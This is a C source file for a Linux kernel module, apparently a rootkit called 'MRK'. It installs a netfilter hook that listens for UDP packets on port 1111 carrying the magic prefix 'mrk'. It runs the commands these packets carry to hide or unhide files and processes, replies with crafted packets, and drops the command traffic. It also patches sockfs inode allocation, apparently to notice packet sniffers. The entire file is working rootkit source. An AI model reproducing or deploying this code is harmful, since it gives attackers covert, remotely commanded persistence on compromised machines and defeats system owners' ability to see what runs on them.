#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/net_namespace.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/workqueue.h>
#include <linux/fs.h>

#include "headers/main.h"

#define CMD_MAGIC ("mrk")
#define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
#define CMD_PORT (1111)
#define RESPONSE_DATA_LEN (3)
#define RESPONSE_HEADER_LEN (sizeof(struct udphdr) + sizeof(struct iphdr) + ETH_HLEN)

typedef u16 job_id_t;

struct cmd_type {
    char *name;
    int (*func)(const char *path);
};

static int exit_func(const char *_) {
    MRK_exit();
    return 0;
}

struct cmd_type cmds[] = {
    {
        "hfile",
        hide_file
    },
    {
        "ufile",
        unhide_file
    },
    {
        "hproc",
        hide_process
    },
    {
        "uproc",
        unhide_process
    },
    {
        "fexit",
        exit_func
    }
};


static int send_response(
    job_id_t job_id,
    char response_status,
    __be32 local_ip,
    __be32 remote_ip,
    __be16 remote_port,    
    unsigned char remote_mac[ETH_ALEN],
    struct net_device *dev
) {
    struct iphdr *iph = NULL;
    struct udphdr *udph = NULL;
    struct ethhdr *eth = NULL;
    struct sk_buff *skb = NULL;
    char *data = NULL;
    printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
    skb = alloc_skb(RESPONSE_DATA_LEN + RESPONSE_HEADER_LEN, GFP_ATOMIC);
    if (!skb) {
        printk(KERN_INFO "failed allocating skb\n");
        return -1;
    }
    skb_reserve(skb, RESPONSE_HEADER_LEN);
    data = skb_put(skb, RESPONSE_DATA_LEN);

    // put response data.
    *(unsigned short *)data = job_id;
    put_unaligned(response_status, data + 2);

    skb_push(skb, sizeof(struct udphdr));
    skb_reset_transport_header(skb);
    udph = udp_hdr(skb);
    udph->source = htons(CMD_PORT);
    udph->dest = remote_port;
    udph->len = htons(RESPONSE_DATA_LEN + sizeof(struct udphdr));
    udph->check = 0;
    udph->check = csum_tcpudp_magic(
        local_ip,
        remote_ip,
        RESPONSE_DATA_LEN + sizeof(struct udphdr),
        IPPROTO_UDP,
        csum_partial(
            udph,
            RESPONSE_DATA_LEN + sizeof(struct udphdr),
            0
        )
    );

    if (udph->check == 0) udph->check = CSUM_MANGLED_0;

    skb_push(skb, sizeof(*iph));
    skb_reset_network_header(skb);
    iph = ip_hdr(skb);
    iph->version = IPVERSION;
    iph->ihl = sizeof(struct iphdr) / 4;
    iph->tos = 0;
    iph->tot_len = htons(RESPONSE_DATA_LEN + sizeof(struct udphdr) + sizeof(struct iphdr));
    iph->id       = 0;
    iph->frag_off = 0;
    iph->ttl      = IPDEFTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check    = 0;
    iph->saddr = local_ip;
    iph->daddr = remote_ip;
    iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);

    eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
    skb_reset_mac_header(skb);
    skb->protocol = eth->h_proto = htons(ETH_P_IP);
    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, remote_mac, ETH_ALEN);

    skb->dev = dev;

    return dev_queue_xmit(skb);
}

struct MRK_command_work {
    struct work_struct work;
    struct cmd_type *cmd;
    const char *arg;
    job_id_t job_id;
    __be32 remote_addr;
    __be32 local_addr;
    __be16 remote_port;
    unsigned char remote_mac[ETH_ALEN];
    struct net_device *dev;
};

static void handle_command(struct work_struct *work) {
    int result = -1;
    struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
    result = command_work->cmd->func(command_work->arg);
    printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
    send_response(
        command_work->job_id, 
        result, 
        command_work->local_addr,
        command_work->remote_addr,
        command_work->remote_port,
        command_work->remote_mac,
        command_work->dev
    );
    // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
    // It is permissible to free the struct work_struct from inside the function that is called from it.
    kfree(command_work->arg);
    kfree(work);
}

static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
    struct udphdr *udph = NULL;
    int user_data_len = 0;

    udph = udp_hdr(skb);
    user_data_len = ntohs(udph->len) - sizeof(struct udphdr);

    #ifdef NET_SKBUFF_DATA_USES_OFFSET
    *user_data = skb->head + skb->tail - user_data_len;
    #else
    *user_data = skb->tail - user_data_len;
    #endif
    
    return user_data_len;
}

static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
    struct cmd_type *cmd = NULL;
    for (cmd = cmds; cmd < (cmds + ARRAY_SIZE(cmds)); ++cmd) {
        if (!strncmp(buffer, cmd->name, strlen(cmd->name))) {
            return cmd;
        }
    }
    return NULL;
}

static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph = NULL;
    struct udphdr *udph = NULL;
    const char *user_data = NULL;
    int user_data_len = 0;
    job_id_t job_id = 0;
    struct cmd_type *cmd = NULL;
    struct MRK_command_work *command_work = NULL;
    char *arg = NULL;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;

    udph = udp_hdr(skb);
    if (ntohs(udph->dest) != CMD_PORT) return NF_ACCEPT;

    user_data_len = get_udp_user_data(skb, &user_data);

    if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
    user_data += CMD_MAGIC_LEN;
    user_data_len -= CMD_MAGIC_LEN;

    job_id = get_unaligned((job_id_t *)user_data);
    user_data += sizeof(job_id_t);
    user_data_len -= sizeof(job_id_t);

    cmd = match_buffer_to_cmd_type(user_data);
    if (cmd == NULL) return NF_ACCEPT;
    user_data += strlen(cmd->name);
    user_data_len -= strlen(cmd->name);

    command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
    INIT_WORK(&command_work->work, handle_command);
    command_work->cmd = cmd;
    // we want the argument to be null-terminated.
    arg = kmalloc(user_data_len + 1, GFP_KERNEL);
    memcpy(arg, user_data, user_data_len);
    arg[user_data_len] = '\0';
    command_work->arg = arg;
    command_work->job_id = job_id;
    command_work->local_addr = iph->daddr;
    command_work->remote_addr = iph->saddr;
    command_work->remote_port = udph->source;
    memcpy(command_work->remote_mac, eth_hdr(skb)->h_source, ETH_ALEN);
    command_work->dev = skb->dev;

    schedule_work(&command_work->work);
    return NF_DROP;
}

static struct inode *(*original_alloc_inode)(struct super_block *sb);

struct nf_hook_ops *net_hook = NULL;

int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
    struct socket *sock = (struct socket *)wq_entry->private;
    if (!strcmp(sock->sk->__sk_common.skc_prot->name, "PACKET")) {
        printk(KERN_INFO "packet socket connected!\n");
    }
    // spin_lock_irqsave(&wq_head->lock, flags);
    list_del_init(&wq_entry->entry);
    // spin_unlock_irqrestore(&wq_head->lock, flags);
    // kfree(wq_entry);
    return 0;
}

static struct inode *new_alloc_inode(struct super_block *sb) {
    struct socket *sock;
    struct wait_queue_entry *wq;
    struct inode *res = original_alloc_inode(sb);
    sock = SOCKET_I(res);
    wq = kmalloc(sizeof(struct wait_queue_entry), GFP_KERNEL);
    init_waitqueue_func_entry(wq, &my_wake_up);
    wq->private = sock;
    add_wait_queue(&sock->wq.wait, wq);
    return res;
}

int MRK_init_nethook(void) {
    int res;
    struct file_system_type *fs_type;
    struct super_block *super;
    struct super_operations *s_op;
    net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
    net_hook->hook = MRK_hookfn;
    net_hook->hooknum = NF_INET_PRE_ROUTING;
    net_hook->pf = PF_INET;
    net_hook->priority = NF_IP_PRI_FILTER;
    if ((res = nf_register_net_hook(&init_net, net_hook))) {
        return res;
    }
    fs_type = get_fs_type("sockfs");
    hlist_for_each_entry(super, &fs_type->fs_supers, s_instances) {
        s_op = (struct super_operations *)kmalloc(sizeof(struct super_operations), GFP_KERNEL);
        memcpy(s_op, super->s_op, sizeof(struct super_operations));
        super->s_op = s_op;
        original_alloc_inode = s_op->alloc_inode;
        s_op->alloc_inode = &new_alloc_inode;
    }
    return 0;
}

void MRK_exit_nethook(void) {
    nf_unregister_net_hook(&init_net, net_hook);
    kfree(net_hook);
}
